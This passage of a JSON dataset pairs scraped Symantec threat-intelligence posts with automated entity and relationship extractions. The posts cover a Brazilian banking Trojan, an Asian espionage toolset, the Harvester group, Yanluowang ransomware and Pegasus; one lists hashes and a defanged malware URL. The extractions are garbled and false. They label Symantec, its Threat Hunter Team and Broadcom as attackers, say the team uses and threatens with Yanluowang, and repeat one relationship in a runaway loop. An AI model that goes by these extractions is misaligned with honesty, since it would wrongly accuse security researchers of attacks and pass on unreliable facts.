      ],
      "relationships": [
        [
          "BlackMatter",
          "uses",
          "Exmatter"
        ],
        [
          "BlackMatter",
          "uses",
          "Ryuk Stealer"
        ],
        [
          "BlackMatter",
          "uses",
          "StealBit"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 3
  },
  {
    "title": "banking trojan latam brazil",
    "link": "https://www.security.com/threat-intelligence/banking-trojan-latam-brazil",
    "content": "Up to 100 organizations in Brazil have been targeted with a banking Trojan since approximately late August 2021, with the most recent activity seen in early October. This campaign appears to be a continuation of activity thatwas published about by researchers at ESET in 2020. The attackers appeared to be undeterred by exposure and Symantec, a division of Broadcom Software, has found a large number of new indicators of compromise (IOCs) relating to this latest wave of attacks. Symantec’s Threat Hunter Team first became aware of this recent campaign when suspicious activity was spotted in a customer environment on September 30, 2021. This initial suspicious activity was detected by our Cloud Analytics technology, and further investigation found that attempts were being made to download a suspicious file named mpr.dll onto the customer’s environment. Msiexec.exe was attempting to download the file from a suspicious URL. Further analysis indicated that five files were downloaded, four of which were signed and appeared to be legitimate DLL files, but the file named mpr.dll was not signed and was suspiciously large for a single DLL file at 588 MB. Symantec researchers concluded that this was a “Latin American banking Trojan”, due to the similar characteristics and file names seen in this campaign and in the research into Latin American banking Trojans published by ESET in 2020. Further investigation by our analysts revealed similar activity had been aimed at multiple different organizations since late August 2021. In fact, as many as 98 organizations may have been targeted with similar activity, with all affected organizations based in Brazil. The sectors targeted with this activity included information technology, professional services, manufacturing, financial services, and government. Banking Trojans are a type of malware designed to steal victims’ online banking information so malicious actors can access victims’ bank accounts. Once on a machine, the malware typically works by monitoring the websites victims are visiting and comparing these to a hardcoded list. If the victim visits a banking website the Trojan will generally display a spoofed login page in a pop-up over the legitimate page in an attempt to harvest victims’ banking credentials. These pop-ups are generally made to imitate the specific banks’ legitimate login pages and are often quite convincing. While once one of the biggest threats on the cyber-crime landscape, banking Trojans have been usurped in many parts of the world by ransomware in recent times. However, in Latin America particularly they still dominate a lot of cyber-crime activity. In its 2020 report, ESET determined that there were 11 banking Trojan gangs operating in Latin America, and that these groups cooperated with each other. It came to this conclusion due to the many shared tactics, tools, and procedures used by the cyber criminals deploying banking Trojans in Latin America. We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems. If the victim double-clicks the MSI file inside the downloaded ZIP, it will execute msiexec.exe, which then connects to a secondary C&C server to download another ZIP file containing the payload (mpr.dll), along with other legitimate portable executable (PE) files. The URLs observed being accessed by msiexec.exe included: The extracted ZIP file contains a renamed legitimate Oracle application - VBoxTray.exe. This is executed to load the payload (mpr.dll) by way of DLL search-order hijacking. DLL search-order hijacking takes advantage of how Windows handles DLLs to allow an attacker to load malicious code into a legitimate process. The mpr.dll file is also bigger than 100 MB in order to evade submission to security services, which tend not to process files above that size. Both of these files and this exact same process were observed in the banking Trojan activity detailed in ESET’s report. Persistence is then created for the renamed VBoxTray.exe so that mpr.dll is always side-loaded into it by way of either Windows Registry or Windows Management Instrumentation (WMI). This is another common technique used in the attack chain for Latin American banking Trojans. The various steps taken by the attackers behind this activity to evade detection - such as using a large file for the payload so that it won’t be scanned by security software, and leveraging legitimate processes and applications for malicious purposes - show that those behind this attack campaign are reasonably sophisticated actors. The number of organizations affected in this campaign also indicates that a large number of people are likely responsible for this activity - and it may be that more than one group is behind this activity. It could be a number of groups acting in a cooperative manner, as ESET said may be the approach taken by the various banking Trojan attack groups operating in Latin America. While ransomware dominates much of the discussion on the cyber-crime landscape at the moment, it is important to remember it is not the only threat out there. Banking Trojans have the potential to be a costly problem for individuals and organizations, so people, especially those based in Latin America where this activity appears to be particularly prevalent, need to remain alert to this threat. Simple steps, like ensuring you have multi-factor authentication enabled on all financial accounts, can help lessen the impact of threats like these. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (banking Trojan, Threat Type), (mpr.dll, File), (msiexec.exe, Tool), (early October, Date), (Symantec, Attacker), (Cloud Analytics, Tool), (ESET, Researcher), (Latin American banking Trojan, Threat Type), (mpr.dll, File)\nRelationships: (banking Trojan, uses, mpr.dll), (banking Trojan, uses, msiexec.exe), (banking Trojan, targets, early October), (Symantec, discovers, similar activity), (Symantec, discovered, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers, similar activity), (Symantec, discovers,",
      "entities": [
        [
          "banking Trojan",
          "Threat Type"
        ],
        [
          "mpr.dll",
          "File"
        ],
        [
          "msiexec.exe",
          "Tool"
        ],
        [
          "early October",
          "Date"
        ],
        [
          "Symantec",
          "Attacker"
        ],
        [
          "Cloud Analytics",
          "Tool"
        ],
        [
          "ESET",
          "Researcher"
        ],
        [
          "Latin American banking Trojan",
          "Threat Type"
        ],
        [
          "mpr.dll",
          "File"
        ]
      ],
      "relationships": [
        [
          "banking Trojan",
          "uses",
          "mpr.dll"
        ],
        [
          "banking Trojan",
          "uses",
          "msiexec.exe"
        ],
        [
          "banking Trojan",
          "targets",
          "early October"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovered",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ],
        [
          "Symantec",
          "discovers",
          "similar activity"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 22
  },
  {
    "title": "espionage campaign south east asia",
    "link": "https://www.security.com/threat-intelligence/espionage-campaign-south-east-asia",
    "content": "An espionage campaign using a previously undocumented toolset has targeted a range of organizations in South East Asia. Among the identified targets are organizations in the defense, healthcare, and information and communications technology (ICT) sectors. The campaign appears to have begun in September 2020 and ran at least until May 2021. The toolset used by the attackers includes loaders, a modular backdoor, a keylogger, and an exfiltration tool designed to abuse cloud storage service Dropbox. The initial infection vector employed by the attackers remains unknown. The earliest sign of attempted compromise is a loader that decrypts and loads a payload from a .dat file. At least two different file names have been observed for the .dat file: sdc-integrity.dat and scs-integrity.dat. The loader also calls the DumpAnalyze export from the decrypted payload. The payload has yet to be identified but is almost certainly a modular backdoor. This can be inferred from one of the modules identified. This \"Orchestrator\" module points to the existence of a separate DLL module that exposes at least 16 functions, as well as the existence of a custom binary command and control (C&C) protocol used by Orchestrator but implemented separately. This module appears to be a core component of the backdoor. It runs as a Windows service and a large part of its functionality is implemented in a separate DLL that is loaded from registry (located in HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\<value_name_resolved_at_runtime>). The module is expected to export the following functions: The module loads a configuration either from a file (CSIDL_COMMON_APPDATA\\Microsoft\\Crypto\\RSA\\Keys.dat) or from the registry (HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\CONFIG). The configuration is encrypted. The module uses the function Decrypt_ByteToByte from the separate DLL to decrypt the configuration. The configuration is expected to contain the following options (stored in XML format): The module also uses the hardcoded mutex name, Global\\QVomit4. Other tools used in the campaign include a keylogger, which shows signs of being authored by the same developer, sharing unique strings with other tools and string obfuscation techniques. The attackers also used 7zr, a legitimate tool that is a lightweight version of the 7-Zip archiver, in addition to a data-exfiltration tool that sends stolen data to Dropbox. The nature of the targets and the tools used have all the hallmarks of an espionage operation. Symantec has yet to attribute the attacks to a known actor and it appears that the attackers took some steps to complicate attribution. For example, it is not clear what language the group speaks and samples of the backdoor module found contained strings in what appeared to be both Cyrillic and Urdu scripts. The only potential clue found to date is that one of the organizations attacked was also targeted by a tool used by the China-linked Leafhopper group (aka APT30) during the same time period. However, there is no evidence as yet to tie the tool to this campaign. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (espionage campaign, Campaign), (loader, Tool), (modular backdoor, Malware), (keylogger, Malware), (exfiltration tool, Tool), (Dropbox, Tool), (sdc-integrity.dat, File), (scs-integrity.dat, File), (DumpAnalyze, Tool), (Windows service, Tool), (DLL, Tool), (custom binary command and control (C&C) protocol, Tool), (Orchestrator, Tool), (Z, Tool)\nRelationships: (espionage campaign, uses, loader), (espionage campaign, uses, modular backdoor), (espionage campaign, uses, keylogger), (espionage campaign, uses, exfiltration tool), (espionage campaign, uses, Dropbox), (loader, downloads, sdc-integrity.dat), (loader, downloads, scs-integrity.dat), (loader, executes, DumpAnalyze), (loader, resolvesTo, Windows service), (loader, contains, DLL), (loader, contains, custom binary command and control (C&C) protocol), (loader, linkedTo, Orchestrator), (loader, executedBy, Z), (Orchestrator, linkedTo, DLL), (Orchestrator, linkedTo, Z), (Orchestrator, linkedTo, custom binary command and control (C&C) protocol)",
      "entities": [
        [
          "espionage campaign",
          "Campaign"
        ],
        [
          "loader",
          "Tool"
        ],
        [
          "modular backdoor",
          "Malware"
        ],
        [
          "keylogger",
          "Malware"
        ],
        [
          "exfiltration tool",
          "Tool"
        ],
        [
          "Dropbox",
          "Tool"
        ],
        [
          "sdc-integrity.dat",
          "File"
        ],
        [
          "scs-integrity.dat",
          "File"
        ],
        [
          "DumpAnalyze",
          "Tool"
        ],
        [
          "Windows service",
          "Tool"
        ],
        [
          "DLL",
          "Tool"
        ],
        [
          "Orchestrator",
          "Tool"
        ],
        [
          "Z",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "espionage campaign",
          "uses",
          "loader"
        ],
        [
          "espionage campaign",
          "uses",
          "modular backdoor"
        ],
        [
          "espionage campaign",
          "uses",
          "keylogger"
        ],
        [
          "espionage campaign",
          "uses",
          "exfiltration tool"
        ],
        [
          "espionage campaign",
          "uses",
          "Dropbox"
        ],
        [
          "loader",
          "downloads",
          "sdc-integrity.dat"
        ],
        [
          "loader",
          "downloads",
          "scs-integrity.dat"
        ],
        [
          "loader",
          "executes",
          "DumpAnalyze"
        ],
        [
          "loader",
          "resolvesTo",
          "Windows service"
        ],
        [
          "loader",
          "contains",
          "DLL"
        ],
        [
          "loader",
          "contains",
          "custom binary command and control (C&C"
        ],
        [
          "loader",
          "linkedTo",
          "Orchestrator"
        ],
        [
          "loader",
          "executedBy",
          "Z"
        ],
        [
          "Orchestrator",
          "linkedTo",
          "DLL"
        ],
        [
          "Orchestrator",
          "linkedTo",
          "Z"
        ],
        [
          "Orchestrator",
          "linkedTo",
          "custom binary command and control (C&C"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 16
  },
  {
    "title": "harvester new apt attacks asia",
    "link": "https://www.security.com/threat-intelligence/harvester-new-apt-attacks-asia",
    "content": "A previously unseen actor, likely nation-state-backed, is targeting organizations in South Asia, with a focus on Afghanistan, in what appears to be an information-stealing campaign using a new toolset. The Harvester group uses both custom malware and publicly available tools in its attacks, which began in June 2021, with the most recent activity seen in October 2021. Sectors targeted include telecommunications, government, and information technology (IT). The capabilities of the tools, their custom development, and the victims targeted, all suggest that Harvester is a nation-state-backed actor. The most notable thing about this campaign is the previously unseen toolset deployed by the attackers. The attackers deployed a custom backdoor called Backdoor.Graphon on victim machines alongside other downloaders and screenshot tools that provided the attackers with remote access and allowed them to spy on user activities and exfiltrate information. We do not know the initial infection vector that Harvester used to compromise victim networks, but the first evidence we found of Harvester activity on victim machines was a malicious URL. The group then started to deploy various tools, including its custom Graphon backdoor, to gain remote access to the network. The group also tried to blend its activity in with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for its command and control (C&C) activity. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: If the file does not exist it downloads a copy from the following URL: Next, the sample creates the following file if it does not exist: Then it sets the following registry value to create a loadpoint: Finally it opens an embedded web browser within its own UI using the following URL: While it initially appeared that this URL may have been a loadpoint for Backdoor.Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor.Graphon is compiled as a .NET PE DLL with export “Main” and the following PDB file name: When this is executed, it attempts to communicate with the attackers’ C&C servers, which are hosted on Microsoft infrastructure. The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted. Data that cmd.exe pulled from the output and error streams is encrypted and sent back to the attackers’ servers. The custom screenshot tool was also packed with the Costura Assembly Loader. The screenshot tool takes photos that it saves to a password-protected ZIP archive for exfiltration, with all archives older than a week deleted. While we do not have enough evidence yet to attribute Harvester’s activity to a specific nation state, the group’s use of custom backdoors, the extensive steps taken to hide its malicious activity, and its targeting all point to it being a state-sponsored actor. Harvester’s use of legitimate infrastructure to host its C&C servers in order to blend in with normal network traffic is one example of the stealthy steps taken by this actor. The targeting of organizations in Afghanistan in this campaign is also interesting given the huge upheaval seen in that country recently. The activity carried out by Harvester makes it clear the purpose of this campaign is espionage, which is the typical motivation behind nation-state-backed activity. That Harvester’s most recent activity was seen earlier this month means that organizations in the sectors and geographies mentioned should be alert to the malicious activity outlined in this blog. For the latest protection updates, please visit theSymantec Protection Bulletin. 0740cc87a7d028ad45a3d54540b91c4d90b6fc54d83bb01842cf23348b25bc42 303f93cc47c58e64665f9e447ac11efe5b83f0cfe4253f3ff62dd7504ee935e0 3c34c23aef8934651937c31be7420d2fc8a22ca260f5afdda0f08f4d3730ae59 3c8fa5cc50eb678d9353c9f94430eeaa74b36270c13ba094dc5c124259f0dc31 470cd1645d1da5566eef36c6e0b2a8ed510383657c4030180eb0083358813cd3 691e170c5e42dd7d488b9d47396b633a981640f8ab890032246bf37704d4d865 a4935e31150a9d6cd00c5a69b40496fea0e6b49bf76f123ea34c3b7ea6f86ce6 c4b6d7e88a63945f3e0768657e299d2d3a4087266b4fc6b1498e2435e311f5d1 cb5e40c6702e8fe9aa64405afe462b76e6fe9479196bb58118ee42aba0641c04 d84a9f7b1d70d83bd3519c4f2c108af93b307e8f7457e72e61f3fa7eb03a5f0d f4a77e9970d53fe7467bdd963e8d1ce44a2d74e3e4262cd55bb67e7b3001c989 hxxps://perfect-couple.com/perfectcouple[.]exe – sample was downloaded from this address BLOG UPDATED2.45pm, October 18, 2021: Minor updates made for clarity The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Harvester, Threat Type), (custom malware, Malware), (publicly available tools, Tool), (CloudFront, Tool), (Microsoft, Tool), (graphon, File), (backdoor.Graphon, Malware), (URL, URL), (C&C, Technique), (legitimate CloudFront, Tool), (legitimate Microsoft, Tool)\nRelationships: (Harvester, uses, custom malware), (Harvester, uses, publicly available tools), (Harvester, uses, graphon), (Harvester, uses, backdoor.Graphon), (Harvester, uses, CloudFront), (Harvester, uses, Microsoft), (Harvester, uses, C&C), (Harvester, uses, legitimate CloudFront), (Harvester, uses, legitimate Microsoft), (Harvester, linkedTo, URL), (Harvester, linkedTo, C&C), (Harvester, linkedTo, legitimate CloudFront), (Harvester, linkedTo, legitimate Microsoft)",
      "entities": [
        [
          "Harvester",
          "Threat Type"
        ],
        [
          "custom malware",
          "Malware"
        ],
        [
          "publicly available tools",
          "Tool"
        ],
        [
          "CloudFront",
          "Tool"
        ],
        [
          "Microsoft",
          "Tool"
        ],
        [
          "graphon",
          "File"
        ],
        [
          "backdoor.Graphon",
          "Malware"
        ],
        [
          "URL",
          "URL"
        ],
        [
          "C&C",
          "Technique"
        ],
        [
          "legitimate CloudFront",
          "Tool"
        ],
        [
          "legitimate Microsoft",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Harvester",
          "uses",
          "custom malware"
        ],
        [
          "Harvester",
          "uses",
          "publicly available tools"
        ],
        [
          "Harvester",
          "uses",
          "graphon"
        ],
        [
          "Harvester",
          "uses",
          "backdoor.Graphon"
        ],
        [
          "Harvester",
          "uses",
          "CloudFront"
        ],
        [
          "Harvester",
          "uses",
          "Microsoft"
        ],
        [
          "Harvester",
          "uses",
          "C&C"
        ],
        [
          "Harvester",
          "uses",
          "legitimate CloudFront"
        ],
        [
          "Harvester",
          "uses",
          "legitimate Microsoft"
        ],
        [
          "Harvester",
          "linkedTo",
          "URL"
        ],
        [
          "Harvester",
          "linkedTo",
          "C&C"
        ],
        [
          "Harvester",
          "linkedTo",
          "legitimate CloudFront"
        ],
        [
          "Harvester",
          "linkedTo",
          "legitimate Microsoft"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 13
  },
  {
    "title": "yanluowang targeted ransomware",
    "link": "https://www.security.com/threat-intelligence/yanluowang-targeted-ransomware",
    "content": "The Symantec Threat Hunter Team, a part ofBroadcom Software, has uncovered what appears to be a new ransomware threat called Yanluowang that is being used in targeted attacks. In a recent attempted ransomware attack against a large organization, Symantec obtained a number of malicious files that, upon further investigation, revealed the threat to be a new, if somewhat underdeveloped, ransomware family. The Threat Hunter Team first spotted suspicious use of AdFind, a legitimate command-line Active Directory query tool, on the victim organization’s network. This tool is often abused by ransomware attackers as a reconnaissance tool, as well as to equip the attackers with the resources that they need for lateral movement via Active Directory. Just days after the suspicious AdFind activity was observed on the victim organization, the attackers attempted to deploy the Yanluowang ransomware. Before the ransomware is deployed on a compromised computer, a precursor tool carries out the following actions: The Yanluowang ransomware is then deployed and carries out the following actions: The ransom note dropped by Yanluowang warns victims not to contact law enforcement or ransomware negotiation firms. If the attackers’ rules are broken the ransomware operators say they will conduct distributed denial of service (DDoS) attacks against the victim, as well as make “calls to employees and business partners.” The criminals also threaten to repeat the attack “in a few weeks” and delete the victim’s data. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec Threat Hunter Team, Attacker), (Yanluowang, Malware), (AdFind, Tool), (Active Directory, System), (DDoS, Technique), (law enforcement, Target), (ransomware negotiation firm, Target)\nRelationships: (Symantec Threat Hunter Team, uses, Yanluowang), (Symantec Threat Hunter Team, discovers, AdFind), (Symantec Threat Hunter Team, observes, Active Directory), (Symantec Threat Hunter Team, attempts, Yanluowang), (Symantec Threat Hunter Team, threatens, DDoS), (Symantec Threat Hunter Team, warns, Yanluowang), (Symantec Threat Hunter Team, says, Yanluowang), (Symantec Threat Hunter Team, deletes, Yanluowang), (Symantec Threat Hunter Team, repeats, Yanluowang)",
      "entities": [
        [
          "Symantec Threat Hunter Team",
          "Attacker"
        ],
        [
          "Yanluowang",
          "Malware"
        ],
        [
          "AdFind",
          "Tool"
        ],
        [
          "Active Directory",
          "System"
        ],
        [
          "DDoS",
          "Technique"
        ],
        [
          "law enforcement",
          "Target"
        ],
        [
          "ransomware negotiation firm",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Symantec Threat Hunter Team",
          "uses",
          "Yanluowang"
        ],
        [
          "Symantec Threat Hunter Team",
          "discovers",
          "AdFind"
        ],
        [
          "Symantec Threat Hunter Team",
          "observes",
          "Active Directory"
        ],
        [
          "Symantec Threat Hunter Team",
          "attempts",
          "Yanluowang"
        ],
        [
          "Symantec Threat Hunter Team",
          "threatens",
          "DDoS"
        ],
        [
          "Symantec Threat Hunter Team",
          "warns",
          "Yanluowang"
        ],
        [
          "Symantec Threat Hunter Team",
          "says",
          "Yanluowang"
        ],
        [
          "Symantec Threat Hunter Team",
          "deletes",
          "Yanluowang"
        ],
        [
          "Symantec Threat Hunter Team",
          "repeats",
          "Yanluowang"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 9
  },
  {
    "title": "ransomware targeted 2021",
    "link": "https://www.security.com/threat-intelligence/ransomware-targeted-2021",
    "content": "For the last number of years, targeted ransomware has been one of the main cyber risks for businesses and other large organizations. However, as outlined in anew whitepaperfrom the Symantec Threat Hunter Team, a part ofBroadcom Software, the past twelve months have seen ransomware attackers become more aggressive, finding more ways to increase the reach of their attacks, and becoming more ambitious by mounting a number of audacious and highly disruptive attacks. The attack against Colonial Pipeline in the U.S. in May 2021 caused significant disruption and prompted concerns about the nation’s fuel supplies. In the same month, an attack on Ireland’s national health service, the Health Service Executive, forced it to cancel thousands of appointments and initiate a recovery operation that is only now concluding. While the overall levels of ransomware activity have fallen, this is accounted for by the decline of mass-mailing, indiscriminate ransomware attacks. Of greater concern is that the number of organizations confirmed as affected by targeted ransomware attacks increased by up by 83% over the past 18 months, from 81 in January 2020 to 148 in June 2021. The real number of targeted ransomware attacks is much higher. Confirmed attacks from known targeted ransomware families are probably only a representative sample of the overall number of attacks involving these threats. Many targeted ransomware attacks are halted before payload deployment, meaning they may not be identified as ransomware. In addition, most targeted ransomware operators recompile their ransomware for every new attack. This means that the variant of the ransomware used in an attack may be blocked by generic or machine learning-generated detections rather than a detection linked to that ransomware family. Alongside this increase in activity levels, the ransomware threat landscape has become more complex and sophisticated and a number of new developments have compounded the threat for organizations. Although ransomware-as-a-service (RaaS) is not a new concept, the RaaS marketplace has evolved significantly over the past year. The basic template currently involves ransomware authors offering access to the ransomware itself, hosting for breached data, and handling of ransom negotiations. In some cases, it has been reported that ransomware developers provide an entire playbook for affiliates. However, some ransomware affiliates now appear to be becoming less reliant on ransomware authors. While affiliates have long been known to migrate to other ransomware developers if the developer they were working with shuts down, many are now using their own distinct tools, tactics, and procedures (TTPs) regardless of the payload they are deploying. Some affiliates now appear to be simultaneously collaborating with more than one ransomware author. Symantec Threat Hunter Team has observed affiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. Over the past 12 months, secondary infections, usually via botnets, have become one of the most prevalent means of access for ransomware groups. Trojans that were once used for financial fraud, such as Trickbot, have recently been repurposed mainly as distribution channels for other malware, most notably ransomware. In some cases, ransomware attackers already control the botnets, such as the Miner group (aka Wizard Spider), which owns the Trickbot botnet. Trickbot has been seen as a precursor to attacks by Ryuk, which is also attributed to Miner. Similarly, Hispid (aka Evil Corp) have leveraged their own Dridex botnet, which was originally built to mount financial attacks, to give them a means of delivering the ransomware to organizations. Other actors have since attempted to replicate this attack pattern, seeking collaborations with established botnet operators. The most notable of these is the use of IcedID by at least one affiliate operator of the Conti ransomware. The profusion of groups carrying out targeted ransomware attacks combined with the evolution of the RaaS marketplace now means that targeted ransomware poses a grave threat to organizations. Although ransomware gangs have attracted significant government and law enforcement attention in recent months, multi-million dollar ransom payments mean that most threat actors remain undeterred. For more information, read our whitepaper: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (targeted ransomware, Threat Type), (Colonial Pipeline, Target), (Health Service Executive, Target), (Symantec Threat Hunter Team, Attacker), (Broadcom Software, Attacker), (U.S., Location), (Ireland, Location), (May 2021, Time Period), (Colonial Pipeline, Target), (Health Service Executive, Target), (June 2021, Time Period)\nRelationships: (targeted ransomware, uses, Colonial Pipeline), (targeted ransomware, uses, Health Service Executive), (colonial pipeline, attackedBy, targeted ransomware), (health service executive, attackedBy, targeted ransomware)",
      "entities": [
        [
          "targeted ransomware",
          "Threat Type"
        ],
        [
          "Colonial Pipeline",
          "Target"
        ],
        [
          "Health Service Executive",
          "Target"
        ],
        [
          "Symantec Threat Hunter Team",
          "Attacker"
        ],
        [
          "Broadcom Software",
          "Attacker"
        ],
        [
          "U.S.",
          "Location"
        ],
        [
          "Ireland",
          "Location"
        ],
        [
          "May 2021",
          "Time Period"
        ],
        [
          "Colonial Pipeline",
          "Target"
        ],
        [
          "Health Service Executive",
          "Target"
        ],
        [
          "June 2021",
          "Time Period"
        ]
      ],
      "relationships": [
        [
          "targeted ransomware",
          "uses",
          "Colonial Pipeline"
        ],
        [
          "targeted ransomware",
          "uses",
          "Health Service Executive"
        ],
        [
          "colonial pipeline",
          "attackedBy",
          "targeted ransomware"
        ],
        [
          "health service executive",
          "attackedBy",
          "targeted ransomware"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 4
  },
  {
    "title": "pegasus forcedentry protection",
    "link": "https://www.security.com/threat-intelligence/pegasus-forcedentry-protection",
    "content": "The recent iOS 14.8 update fixes a zero-day, zero-click exploit for a vulnerability affecting every mobile iOS device. The flaw, dubbed FORCEDENTRY (CVE-2021-30860), resided in Apple’s iMessage and, according toa report by The Citizen Lab, was used to push NSO Group’s Pegasus spyware to mobile iOS devices dating back to as far as February 2021. Pegasus has been around for some years now but has been back in the spotlight recently following reports from both The Citizen Lab andAmnesty Internationalabout the spyware targeting journalists, activists, and others. One of the main concerns with FORCEDENTRY is that it can be used in what is called a zero-click attack, meaning it requires no user interaction. An attacker exploiting the flaw only needs the Apple ID of a device in order to silently compromise it This post will cover what is currently known about the Pegasus threat, how common it is, and how Symantec, a part ofBroadcom Software, is keeping its customers safe from the spyware. Developed by Israeli cyber arms firm NSO Group, Pegasus is a sophisticated and elusive mobile spyware that has been around for some years now. Pegasus has the ability to read messages, track calls, track device location, collect passwords, and access the target device's microphone and camera. According to NSO Group, Pegasus is sold to nation-states and law enforcement to help in the fight against crime and terrorism, and to maintain public safety. Despite this statement, misuse of the software has been flagged over the years and Symantec has had a long-standing capability to detect it. A recent reportuncovered attacks exploiting vulnerabilities in Apple's iMessage service in order to install Pegasus. The attack only needs the Apple ID - an email or phone number - to infect the targeted mobile device. The attack payload uses iMessage fields that are \"hidden\" from the user; in fact, if the iMessage text field is blank, no alerts or notifications are shown at all. This type of iMessage zero-click attack dates back to iOS 11 and research done by the Google Project Zero team. The payload exploits vulnerabilities in the iMessage framework, such as exploiting the PDF processor by sending a maliciously crafted PDF to achieve arbitrary code execution (fixed in the iOS 14.8 update). Further, the attack execution takes place entirely inside the iMessage framework’s sandbox processes and is wiped when the device restarts. Suffice to say, this makes measuring the scope of the Pegasus threat challenging. The best clue left behind by a FORCEDENTRY attack is the resulting web traffic it generates when it tries to download Pegasus spyware framework files. Reports from Amnesty International listed known Pegasus infection URLs. We ran that list against theSymantec WebPulseURL reputation service used by Symantec Endpoint Protection Mobile to identify and block suspect web traffic. We found close to 1 in 150,000 iOS devices attempting to access a known Pegasus infection URL. While this number might seem low, this is only one part of the kill chain and the list of known infection URLs is by no means exhaustive. In any case, Symantec WebPulse was able to identify the URLs as potential risks or malicious, and stop the infection and kill chain - even if it contained zero-day exploits and required zero user clicks - dead in its tracks. Symantec Endpoint Protection Mobile analyzes links contained within SMS messages, shielding users from attacks by checking URLs (even those that might be hidden to the user) against the threat intelligence in Symantec WebPulse, part of the Symantec Global Intelligence Network. Symantec Endpoint Protection Mobile provides protection against network content threats, filtering and blocking communication to known command-and-control servers used in Pegasus campaigns (the same WebPulse global URL intelligence information isembedded in both our Windows and Mac Symantec Endpoint Protection agents). It can also identify and protect vulnerable iOS & Android devices. For more details around coverage see the Pegasus SpywareProtection Bulletinfrom the Symantec Security Center. Patches for FORCEDENTRY are available formacOS,iOS, iPadOS, andwatchOS, and users are advised to apply these patches as soon as possible. Apple addressed the FORCEDENTRY vulnerability quickly with its iOS 14.8 update. However, with the iMessage framework increasingly a target for threat hunters, we expect many more fixes to come. We also expect the number of attacks targeting iOS devices will follow similar attack patterns used by Pegasus. Unfortunately, with limited visibility into the attack payload and kill chain, attackers know they can easily evade detection. All this highlights how important it is to have mobile endpoint protection as part of a layered network defense strategy to prevent known and unknown (zero-day) attacks targeting mobile devices. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
